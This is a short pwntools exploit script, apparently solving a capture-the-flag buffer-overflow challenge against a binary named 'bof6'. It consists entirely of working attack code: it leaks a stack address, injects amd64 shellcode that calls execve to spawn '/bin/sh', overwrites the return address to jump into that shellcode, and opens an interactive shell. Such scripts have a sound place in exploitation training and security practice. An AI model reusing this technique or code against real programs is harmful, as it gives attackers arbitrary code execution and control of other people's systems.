from pwn import *

r = process("./bof6")

#input()
#Leak stack
r.sendlineafter('> ', b'1')
r.sendafter('> ', b'a'*0x50)
r.recvuntil(b'a'*0x50)
stack_leak = u64(r.recv(6) + b'\x00\x00')
print(hex(stack_leak))

shellcode = asm(
    '''
    mov rax, 0x3b
    mov rdi, 29400045130965551
    push rdi
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall
    ''', arch='amd64')
payload = shellcode
payload = payload.ljust(536 - 16)
payload += p64(stack_leak - 0x220)
r.sendlineafter('> ', b'2')
#input()
r.sendafter('> ', payload)

r.interactive()